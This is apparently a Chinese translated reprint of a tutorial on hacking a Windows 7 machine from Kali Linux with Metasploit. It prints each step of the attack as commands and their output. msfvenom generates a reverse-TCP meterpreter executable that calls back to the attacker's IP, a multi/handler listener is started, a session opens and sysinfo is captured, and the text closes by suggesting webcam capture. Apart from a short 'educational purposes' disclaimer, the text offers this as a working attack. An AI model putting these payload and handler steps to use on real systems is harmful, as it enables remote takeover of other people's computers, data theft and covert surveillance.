---
title: '如何使用 Kali Linux 黑掉 Windows' 
date: 2019-01-23 2:30:08
hidden: true
slug: wuxqtauyqk
categories: [reprint]
---

{{< raw >}}

            <h1><a href="#如何使用-kali-linux-黑掉-windows"></a>如何使用 Kali Linux 黑掉 Windows</h1>
<p>Kali Linux 派生自 Debian Linux，主要用于渗透测试，拥有超过 300 个的预安装好的渗透测试工具。Metasploit 项目中 Metasploit 框架支持 Kali Linux 平台，Metasploit 是一个用于开发和执行安全利用代码（security exploit）的工具。让我们来使用 Kali Linux 来攻破 Windows 吧。请注意，我写这篇文章只是出于教育目的哦——一切因此带来的后果和本文作者、译者无关。</p>
<h3><a href="#源机器详情"></a>源机器详情</h3>
<p>Kali Linux</p>
<pre><code class="hljs elixir">root<span class="hljs-variable">@kali</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># uname -a</span>
Linux kali <span class="hljs-number">4.6</span>.<span class="hljs-number">0</span>-kali1-amd64 <span class="hljs-comment">#1 SMP Debian 4.6.4-1kali1 (2016-07-21) x86_64 GNU/Linux</span>
root<span class="hljs-variable">@kali</span><span class="hljs-symbol">:/</span><span class="hljs-comment">#</span>

</code></pre><p>用做攻击对象的目标机器：</p>
<pre><code class="hljs lsl">Windows <span class="hljs-number">7</span> Ultimate SP1

</code></pre><h3><a href="#步骤-1创建-payload-程序"></a>步骤 1：创建 Payload 程序</h3>
<p>Payload 是一个类似于病毒或者木马的程序，可以运行在远程目标上 —— 为了黑掉那台机器。可以通过以下命令来创建 Payload（<code>program.exe</code>），以便能使用 Kali Linux 黑掉 Windows。</p>
<pre><code class="hljs routeros">root@kali:/# msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.189.128 <span class="hljs-attribute">LPORT</span>=4444 <span class="hljs-attribute">--format</span>=exe -o /root/program.exe
<span class="hljs-literal">No</span> platform was selected, choosing Msf::Module::Platform::Windows <span class="hljs-keyword">from</span> the payload
<span class="hljs-literal">No</span> Arch selected, selecting Arch: x86 <span class="hljs-keyword">from</span> the payload
<span class="hljs-literal">No</span> encoder <span class="hljs-keyword">or</span> badchars specified, outputting<span class="hljs-built_in"> raw </span>payload
Payload size: 333 bytes
Final size of exe file: 73802 bytes
Saved as: /root/program.exe
root@kali:/# ls -la /root/program.exe
-rw-r--r-- 1 root root 73802 Jan 26 00:46 /root/program.exe

</code></pre><p>通过 <code>ls</code> 命令，我们可以确认 Payload 程序是否成功生成在指定的位置。</p>
<h3><a href="#步骤-2运行-mfsconsole-命令启动-msf-命令窗口"></a>步骤 2：运行 <code>mfsconsole</code> 命令启动 msf 命令窗口</h3>
<pre><code class="hljs elixir">root<span class="hljs-variable">@kali</span><span class="hljs-symbol">:</span><span class="hljs-comment"># msfconsole</span>


                                   .,,.                  .
                                .\<span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$L</span>..,,==aaccaacc%<span class="hljs-comment">#s$b.       d8,    d8P</span>
                     d8P        <span class="hljs-comment">#$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p</span>
                  d888888P      <span class="hljs-string">'7$$$$\""""'</span><span class="hljs-string">'^^`` .7$$$|D*"'</span>```         ?<span class="hljs-number">88</span><span class="hljs-string">'
  d8bd8b.d8p d8888b ?88'</span> d888b8b            <span class="hljs-number">_</span>.os<span class="hljs-comment">#$|8*"`   d8P       ?8b  88P</span>
  <span class="hljs-number">88</span>P`?P<span class="hljs-string">'?P d8b_,dP 88P d8P'</span> ?<span class="hljs-number">88</span>       .oaS<span class="hljs-comment">###S*"`       d8P d8888b $whi?88b 88b</span>
 d88  d8 ?<span class="hljs-number">8</span> <span class="hljs-number">88</span>b     <span class="hljs-number">88</span>b <span class="hljs-number">88</span>b  ,<span class="hljs-number">88</span>b .osS<span class="hljs-variable">$$</span><span class="hljs-variable">$$</span>*<span class="hljs-string">" ?88,.d88b, d88 d8P' ?88 88P `?8b
d88' d88b 8b`?8888P'`?8b`?88P'.aS$$$$Q*"</span>`    `?<span class="hljs-number">88</span><span class="hljs-string">'  ?88 ?88 88b  d88 d88
                          .a#$$$$$$"`          88b  d8P  88b`?8888P'</span>
                       ,s<span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$"</span>`             <span class="hljs-number">888888</span>P<span class="hljs-string">'   88n      _.,,,ass;:
                    .a$$$$$$$P`               d88P'</span>    .,.ass%<span class="hljs-comment">#S$$$$$$$$$$$$$$'</span>
                 .a<span class="hljs-variable">$#</span><span class="hljs-comment">##$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'</span>
              ,a<span class="hljs-variable">$$</span><span class="hljs-comment">###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'</span>
           .a<span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$$</span>SSS<span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$$</span>SS<span class="hljs-comment">##==--""''^^/$$$$$$'</span>
______________________________________________________________<span class="hljs-number">_</span>   ,&amp;<span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-variable">$$</span><span class="hljs-string">'_____
                                                                 ll&amp;&amp;$$$$'</span>
                                                              .;;lll&amp;&amp;&amp;&amp;<span class="hljs-string">'
                                                            ...;;lllll&amp;'</span>
                                                          ......;;;llll;;;....
                                                           ` ......;;;;... .  .


Taking notes <span class="hljs-keyword">in</span> notepad? Have Metasploit Pro track &amp; report
your progress <span class="hljs-keyword">and</span> findings -- learn more on <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/rapid7.com/metasploit</span>

       =[ metasploit v4.<span class="hljs-number">12.22</span>-dev                         ]
+ -- --=[ <span class="hljs-number">1577</span> exploits - <span class="hljs-number">906</span> auxiliary - <span class="hljs-number">272</span> post        ]
+ -- --=[ <span class="hljs-number">455</span> payloads - <span class="hljs-number">39</span> encoders - <span class="hljs-number">8</span> nops             ]
+ -- --=[ Free Metasploit Pro <span class="hljs-symbol">trial:</span> <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/r-7.co/trymsp</span> ]

msf &gt;

</code></pre><h3><a href="#步骤-3进行漏洞利用的细节"></a>步骤 3：进行漏洞利用的细节</h3>
<ul>
<li>4444 端口：你可以按照自己的想法来选择使用哪个端口</li>
<li>LHOST IP：表示 Kali Linux 机器的 IP，这里是 192.168.189.128。 使用如下命令来查看你的 Kali Linux 机器的 IP。</li>
</ul>
<pre><code class="hljs routeros">root@kali:/#<span class="hljs-built_in"> ip </span>r l
192.168.189.0/24 dev eth0  proto kernel  scope link  src 192.168.189.128  metric 100
root@kali:/#

</code></pre><p>现在在 msf 命令窗口使用 <code>use exploit/multi/handler</code> 命令，如下：</p>
<pre><code class="hljs aspectj">msf &gt; use exploit/multi/<span class="hljs-keyword">handler</span>
msf exploit(<span class="hljs-keyword">handler</span>) &gt;

</code></pre><p>然后在接下来的命令窗口中使用命令 <code>set payload windows/meterpreter/reverse_tcp</code>：</p>
<pre><code class="hljs gams">msf exploit(handler) &gt; <span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>
payload <span class="hljs-comment">=&gt; windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>

</code></pre><p>现在使用 LHOST 和 LPORT 来设置本地 IP 和本地端口，如下：</p>
<pre><code class="hljs lsl">msf exploit(handler) &gt; set lhost <span class="hljs-number">192.168</span><span class="hljs-number">.189</span><span class="hljs-number">.128</span>
lhost =&gt; <span class="hljs-number">192.168</span><span class="hljs-number">.189</span><span class="hljs-number">.128</span>
msf exploit(handler) &gt; set lport <span class="hljs-number">4444</span>
lport =&gt; <span class="hljs-number">4444</span>

</code></pre><p>最后使用 <code>exploit</code> 命令。</p>
<pre><code class="hljs css"><span class="hljs-selector-tag">msf</span> <span class="hljs-selector-tag">exploit</span>(<span class="hljs-selector-tag">handler</span>) &gt; <span class="hljs-selector-tag">exploit</span>

<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Started</span> <span class="hljs-selector-tag">reverse</span> <span class="hljs-selector-tag">TCP</span> <span class="hljs-selector-tag">handler</span> <span class="hljs-selector-tag">on</span> 192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.189</span><span class="hljs-selector-class">.128</span><span class="hljs-selector-pseudo">:4444</span>
<span class="hljs-selector-attr">[*]</span> <span class="hljs-selector-tag">Starting</span> <span class="hljs-selector-tag">the</span> <span class="hljs-selector-tag">payload</span> <span class="hljs-selector-tag">handler</span>...

</code></pre><p>现在你需要在 Windows 上运行 <code>program.exe</code>，一旦它在目标机器上执行，你就可以建立一个 meterpreter 会话。输入 <code>sysinfo</code> 就可以得到这台被黑掉的 Windows 机器的详情。</p>
<pre><code class="hljs routeros">msf exploit(handler) &gt; exploit

[*] Started reverse TCP handler on 192.168.189.128:4444
[*] Starting the payload handler<span class="hljs-built_in">..</span>.
[*] Sending stage (957999 bytes) <span class="hljs-keyword">to</span> 192.168.189.1
[*] Meterpreter session 1 opened (192.168.189.128:4444 -&gt; 192.168.189.1:53091) at 2017-01-26 00:51:31 +0000

meterpreter &gt; sysinfo
Computer        : MANN-PC
OS              : Windows 7 (Build 7601,<span class="hljs-built_in"> Service </span>Pack 1).
Architecture    : x64 (Current Process is WOW64)<span class="hljs-built_in">
System </span>Language : en_IN
Domain          : WORKGROUP
Logged On<span class="hljs-built_in"> Users </span>: 2
Meterpreter     : x86/win32

</code></pre><p>一旦你得到了这些详细信息，就可以做更多的漏洞利用，或者通过 <code>help</code> 命令获取更多信息，以便列出你可以黑掉该系统的所有选项，比如 <code>webcam_snap</code> 命令获取网络摄像头，同样你还可以使用其他更多的可用选项。祝你入侵愉快！！！！ ←_←</p>
<hr>
<p>译者简介：</p>
<p><a href="http://GHLandy.com">GHLandy</a> —— 划不完粉腮柳眉泣别离。</p>
<hr>
<p>via: <a href="http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/">http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/</a></p>
<p>作者：<a href="http://www.linuxroutes.com/quick-guide-how-to-hack-windows-with-kali-linux/">Manmohan Mirkar</a> 译者：<a href="https://github.com/GHLandy">GHLandy</a> 校对：<a href="https://github.com/wxy">wxy</a></p>
<p>本文由 <a href="https://github.com/LCTT/TranslateProject">LCTT</a> 原创编译，<a href="https://linux.cn/">Linux中国</a> 荣誉推出</p>

          
{{< /raw >}}

# 版权声明
本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有，

本文仅用于学习、研究和交流目的。转载请注明出处、完整链接以及原作者。

原作者若认为本站侵犯了您的版权，请联系我们，我们会立即删除！

## 原文标题
如何使用 Kali Linux 黑掉 Windows

## 原文链接
[https://www.zcfy.cc/article/how-to-hack-windows-with-kali-linux](https://www.zcfy.cc/article/how-to-hack-windows-with-kali-linux)

